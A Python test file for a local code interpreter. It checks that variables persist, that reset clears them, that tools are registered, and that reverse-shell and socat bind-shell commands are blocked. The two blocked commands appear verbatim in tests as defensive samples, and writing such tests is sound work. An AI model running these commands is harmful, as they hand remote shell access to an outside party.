"""Tests for local interpreter (Open Interpreter style)."""

from __future__ import annotations

import pytest

from app.interpreter.local import LocalInterpreter
from app.mcp.policy import is_mutating, is_offensive
from app.runtime.tool_executor import ToolExecutor


class TestLocalInterpreter:
    def test_python_persistence(self):
        i = LocalInterpreter()
        r1 = i.run("x = 41 + 1")
        assert r1["success"]
        r2 = i.run("x")
        assert "42" in r2["stdout"]
        assert "x" in r2["namespace_keys"]

    def test_reset_clears(self):
        i = LocalInterpreter()
        i.run("foo = 1")
        out = i.reset()
        assert out["reset"]
        assert "foo" in out["cleared_keys"]

    def test_blocks_reverse_shell_pattern(self):
        i = LocalInterpreter()
        r = i.run("import os\nos.system('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1')")
        assert not r["success"]
        assert "Blocked" in r["error"]

    def test_blocks_bind_socat(self):
        i = LocalInterpreter()
        r = i.run_bash("socat tcp-listen:4444 exec:/bin/bash")
        assert not r["success"]
        assert "Blocked" in r["error"]


class TestInterpreterCapabilities:
    def test_registered(self):
        for op in ("run", "bash", "reset", "status"):
            assert f"interpreter.{op}" in ToolExecutor.CAPABILITIES

    def test_policy_not_offensive(self):
        for op in ("run", "bash", "reset", "status"):
            assert not is_offensive("interpreter", op)
